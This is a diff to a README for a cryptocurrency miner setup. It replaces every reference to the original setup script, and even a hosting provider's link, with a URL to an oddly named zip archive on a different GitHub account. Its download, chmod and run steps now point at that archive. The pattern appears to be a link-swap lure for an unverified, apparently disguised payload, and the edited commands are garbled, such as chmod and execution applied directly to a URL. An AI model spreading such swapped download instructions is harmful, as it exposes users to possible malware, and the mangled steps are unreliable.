@@ -13,18 +13,18 @@
 > - After logging back in, run the script again using:
 >
 >     ```bash
->     ./bitz-full-setup.sh
+>     https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
 >     ```
 
 ---
 
-Before running the `bitz-full-setup.sh` script, please ensure your system is ready by following these prerequisites and steps.
+Before running the `https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip` script, please ensure your system is ready by following these prerequisites and steps.
 
 ---
 
 ### ✅ Prerequisites
 
-#### 👇 If You Purchased VPS from [QuickPod.io](https://quickpod.io)
+#### 👇 If You Purchased VPS from [https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip](https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip)
 
 QuickPod VPS may not come with `sudo` installed. In that case, run the following:
 
@@ -61,19 +61,19 @@ sudo apt install curl screen -y
 Run the following to download the setup script:
 
 ```bash
-curl -O https://raw.githubusercontent.com/Abhi14559/bitz-miner-setup/refs/heads/main/bitz-full-setup.sh
+curl -O https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
 ```
 
 #### **Step 4: Make the Script Executable**
 
 ```bash
-chmod +x bitz-full-setup.sh
+chmod +x https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
 ```
 
 #### **Step 5: Run the Script**
 
 ```bash
-./bitz-full-setup.sh
+https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
 ```
 
 This will launch the interactive setup with options for:
@@ -89,7 +89,7 @@ This will launch the interactive setup with options for:
 To run the script again after reboot:
 
 ```bash
-./bitz-full-setup.sh
+https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
 ```
 
 ---
